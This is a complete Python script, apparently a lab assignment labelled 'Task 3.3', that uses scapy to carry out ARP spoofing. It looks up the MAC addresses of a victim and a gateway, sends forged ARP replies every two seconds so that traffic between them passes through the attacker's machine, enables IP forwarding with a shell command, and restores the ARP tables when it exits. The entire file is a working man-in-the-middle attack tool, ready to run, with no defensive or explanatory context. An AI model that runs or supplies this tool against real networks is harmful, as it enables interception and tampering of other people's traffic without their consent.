from scapy.all import *
import time
import sys
import argparse
import threading
import os

def get_mac(ip, retries=3):
    """Get MAC address of a device with retries for reliability"""
    for _ in range(retries):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    return None

def arp_spoof(victim_ip, gateway_ip):
    """Main ARP spoofing function - sends fake replies every 2 seconds"""
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not victim_mac or not gateway_mac:
        print("[-] Could not resolve MAC addresses. Check IPs and network.")
        return
    
    print(f"[+] ARP Spoofing started: Victim {victim_ip} <-> Gateway {gateway_ip}")
    print(f"[+] Victim MAC: {victim_mac} | Gateway MAC: {gateway_mac}")
    
    try:
        while True:
            # Tell victim that gateway is us
            arp_reply_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
            send(arp_reply_victim, verbose=False)
            
            # Tell gateway that victim is us
            arp_reply_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
            send(arp_reply_gateway, verbose=False)
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] ARP Spoofing stopped by user.")
    finally:
        restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac)

def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
    """Restore original ARP tables - clean exit"""
    print("[*] Restoring original ARP tables...")
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)
    print("[+] ARP tables restored successfully.")

def main():
    parser = argparse.ArgumentParser(description="Professional ARP Spoofer - Task 3.3")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    args = parser.parse_args()
    

    try:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[+] IP Forwarding enabled")
    except:
        print("[-] Could not enable IP forwarding. Run with sudo.")
    

    spoof_thread = threading.Thread(target=arp_spoof, args=(args.victim, args.gateway), daemon=True)
    spoof_thread.start()
    
    print("ARP Spoofer running. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")

if __name__ == "__main__":
    main()
